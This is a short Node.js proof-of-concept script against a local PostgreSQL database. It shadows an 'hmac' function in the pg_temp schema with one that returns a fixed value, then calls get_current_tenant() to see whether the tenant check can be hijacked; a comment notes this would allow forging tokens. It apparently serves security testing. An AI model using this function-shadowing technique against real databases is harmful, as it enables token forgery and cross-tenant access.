const { Pool } = require('pg');
const pool = new Pool({ user: 'u0_a338', host: '127.0.0.1', database: 'postgres', port: 5432 });

async function run() {
    const client = await pool.connect();
    try {
        await client.query("CREATE FUNCTION pg_temp.hmac(bytea, bytea, text) RETURNS bytea AS $$ BEGIN RETURN '\\x1234'::bytea; END; $$ LANGUAGE plpgsql;");
        
        const res = await client.query("SELECT get_current_tenant()");
        console.log("Tenant:", res.rows[0].get_current_tenant);
        // If it was hijacked, we could forge tokens!
    } catch(e) {
        console.log("Error:", e.message);
    } finally {
        client.release();
        pool.end();
    }
}
run();
